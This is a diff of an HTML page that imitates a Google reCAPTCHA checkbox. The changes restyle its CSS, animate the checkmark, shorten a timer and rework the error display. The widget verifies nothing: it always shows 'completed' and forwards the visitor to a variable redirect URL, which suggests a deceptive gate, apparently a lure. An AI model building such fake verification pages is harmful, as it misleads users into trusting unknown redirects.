@@ -5,159 +5,182 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>reCAPTCHA</title>
     <style>
-        body {
-            font-family: 'Roboto', Arial, sans-serif;
-            margin: 0;
-            background-color: #f9f9f9;
-            overflow: hidden;
+    body {
+        font-family: 'Roboto', Arial, sans-serif;
+        margin: 0;
+        background-color: #f9f9f9;
+        overflow: hidden;
+    }
+    .container {
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        display: flex;
+        flex-direction: column;
+        align-items: flex-start;
+        gap: 10px;
+    }
+    .captcha-container {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        width: 300px;
+        padding: 10px;
+        border: 1px solid #dfe1e5;
+        border-radius: 4px;
+        background-color: #fff;
+    }
+    .captcha-container[lang="el"], 
+    .captcha-container[lang="ps"], 
+    .captcha-container[lang="ur"], 
+    .captcha-container[lang="tl"] {
+        width: 320px;
+    }
+    .captcha-left {
+        display: flex;
+        align-items: center;
+    }
+    .captcha-checkbox {
+        margin-right: 10px;
+        width: 20px;
+        height: 20px;
+        cursor: pointer;
+        border: 2px solid #000;
+        background-color: transparent;
+        position: relative;
+        appearance: none;
+        -webkit-appearance: none;
+        -moz-appearance: none;
+    }
+    .captcha-checkbox.loading {
+        border: none;
+        background-color: transparent;
+    }
+    .captcha-checkbox.loading::before {
+        content: '';
+        width: 20px;
+        height: 20px;
+        border: 3px solid #1a73e8;
+        border-top-color: transparent;
+        border-radius: 50%;
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        animation: spin 0.8s linear infinite;
+    }
+    .captcha-checkbox.completed {
+        border: none;
+        background-color: transparent;
+    }
+    .captcha-checkbox.completed::before {
+        content: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" viewBox="0 0 28 28" fill="none" stroke="green" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>');
+        position: absolute;
+        top: 64%;
+        left: 55%;
+        transform: translate(-50%, -50%) scale(1);
+        opacity: 0;
+        animation: fadeInCheck 0.4s ease-in-out forwards;
+    }
+    @keyframes spin {
+        0% { transform: translate(-50%, -50%) rotate(0deg); }
+        100% { transform: translate(-50%, -50%) rotate(360deg); }
+    }
+    @keyframes fadeInCheck {
+        from {
+            opacity: 0;
+            transform: translate(-50%, -50%) scale(0.5);
         }
-        .container {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            display: flex;
-            flex-direction: column;
-            align-items: flex-start;
-            gap: 10px;
+        to {
+            opacity: 1;
+            transform: translate(-50%, -50%) scale(1);
         }
-        .captcha-container {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            width: 300px;
-            padding: 10px;
-            border: 1px solid #dfe1e5;
-            border-radius: 4px;
-            background-color: #fff;
-        }
-        .captcha-container[lang="el"], 
-        .captcha-container[lang="ps"], 
-        .captcha-container[lang="ur"], 
-        .captcha-container[lang="tl"] {
-            width: 320px;
-        }
-        .captcha-left {
-            display: flex;
-            align-items: center;
-        }
-        .captcha-checkbox {
-            margin-right: 10px;
-            width: 20px;
-            height: 20px;
-            cursor: pointer;
-            border: 2px solid #000;
-            background-color: transparent;
-            position: relative;
-            appearance: none;
-            -webkit-appearance: none;
-            -moz-appearance: none;
-        }
-        .captcha-checkbox.loading {
-            border: none;
-            background-color: transparent;
-        }
-        .captcha-checkbox.loading::before {
-            content: '';
-            width: 20px;
-            height: 20px;
-            border: 3px solid #1a73e8;
-            border-top-color: transparent;
-            border-radius: 50%;
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            animation: spin 0.8s linear infinite;
-        }
-        .captcha-checkbox.completed {
-            border: none;
-            background-color: transparent;
-        }
-        .captcha-checkbox.completed::before {
-            content: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="34" height="34" viewBox="0 0 28 28" fill="none" stroke="green" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>');
-            position: absolute;
-            top: 65%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            display: block;
-        }
-        @keyframes spin {
-            0% { transform: translate(-50%, -50%) rotate(0deg); }
-            100% { transform: translate(-50%, -50%) rotate(360deg); }
-        }
-        .captcha-text {
-            font-size: 13px;
-            color: #000;
-            white-space: nowrap;
-        }
-        [lang="el"] .captcha-text, 
-        [lang="ps"] .captcha-text, 
-        [lang="ur"] .captcha-text, 
-        [lang="tl"] .captcha-text {
-            font-size: 12px;
-        }
-        .captcha-right {
-            display: flex;
-            flex-direction: column;
-            align-items: flex-end;
-        }
-        .captcha-logo {
-            width: 20px;
-            height: 20px;
-            margin-bottom: 5px;
-        }
-        .captcha-brand {
-            font-size: 11px;
-            color: #757575;
-        }
-        .captcha-links {
-            font-size: 9px;
-            color: #757575;
-        }
-        .captcha-links a {
-            color: #757575;
-            text-decoration: none;
-        }
-        .submit-button {
-            padding: 8px 16px;
-            background-color: #f1f3f4;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            font-size: 13px;
-            color: #202124;
-            cursor: pointer;
-            white-space: nowrap;
-        }
-        [lang="el"] .submit-button, 
-        [lang="ps"] .submit-button, 
-        [lang="ur"] .submit-button, 
-        [lang="tl"] .submit-button {
-            font-size: 12px;
-        }
-        .submit-button:hover {
-            background-color: #e8eaed;
-        }
-        .button-container {
-            display: flex;
-            flex-direction: column;
-            align-items: flex-start;
-        }
-        .error {
-            color: red;
-            font-size: 11px;
-            display: none;
-            margin-top: 5px;
-            white-space: nowrap;
-        }
-        body[lang="ar"], body[lang="ur"] {
-            direction: rtl;
-            text-align: right;
-        }
-        .captcha-container[lang="ar"], .captcha-container[lang="ur"] {
-            flex-direction: row-reverse;
-        }
-    </style>
+    }
+    .captcha-text {
+        font-size: 16px;
+        color: #000;
+        line-height: 20px;
+        white-space: nowrap;
+    }
+    [lang="el"] .captcha-text, 
+    [lang="ps"] .captcha-text, 
+    [lang="ur"] .captcha-text, 
+    [lang="tl"] .captcha-text {
+        font-size: 12px;
+    }
+    .captcha-right {
+        display: flex;
+        flex-direction: column;
+        align-items: flex-end;
+    }
+    .captcha-logo {
+        width: 20px;
+        height: 20px;
+        margin-bottom: 5px;
+    }
+    .captcha-brand {
+        font-size: 12px;
+        color: #4285f4;
+    }
+    .captcha-links {
+        font-size: 10px;
+        color: #757575;
+    }
+    .captcha-links a {
+        color: #757575;
+        text-decoration: none;
+    }
+    .submit-button {
+        padding: 8px 16px;
+        background-color: #f1f3f4;
+        border: 1px solid #dadce0;
+        border-radius: 4px;
+        font-size: 13px;
+        color: #202124;
+        cursor: pointer;
+        white-space: nowrap;
+    }
+    [lang="el"] .submit-button, 
+    [lang="ps"] .submit-button, 
+    [lang="ur"] .submit-button, 
+    [lang="tl"] .submit-button {
+        font-size: 12px;
+    }
+    .submit-button:hover {
+        background-color: #e8eaed;
+    }
+    .button-container {
+        display: flex;
+        flex-direction: column;
+        align-items: flex-start;
+    }
+    .error {
+    color: red;
+    font-size: 11px;
+    max-height: 0;
+    opacity: 0;
+    overflow: hidden;
+    margin-top: 0;
+    white-space: nowrap;
+    transition: max-height 0.3s ease, opacity 0.3s ease, margin-top 0.3s ease;
+}
+
+.error.show {
+    max-height: 50px; /* достаточно для текста */
+    opacity: 1;
+    margin-top: 5px;
+}
+
+    body[lang="ar"], body[lang="ur"] {
+        direction: rtl;
+        text-align: right;
+    }
+    .captcha-container[lang="ar"], .captcha-container[lang="ur"] {
+        flex-direction: row-reverse;
+    }
+</style>
+
 </head>
 <body>
     <div class="container">
@@ -394,18 +417,19 @@
                 setTimeout(() => {
                     window.location.href = redirectUrl;
                 }, 1000);
-            }, 2000);
+            }, 1500);
         });
 
         // Обработка кнопки Submit
-        document.getElementById('submit-button').addEventListener('click', function () {
-            if (!checkbox.classList.contains('completed')) {
-                error.style.display = 'block';
-            } else {
-                error.style.display = 'none';
-                window.location.href = redirectUrl;
-            }
-        });
+document.getElementById('submit-button').addEventListener('click', function () {
+    if (!checkbox.classList.contains('completed')) {
+        error.classList.add('show');
+    } else {
+        error.classList.remove('show');
+        window.location.href = redirectUrl;
+    }
+});
+
     </script>
 </body>
 </html>
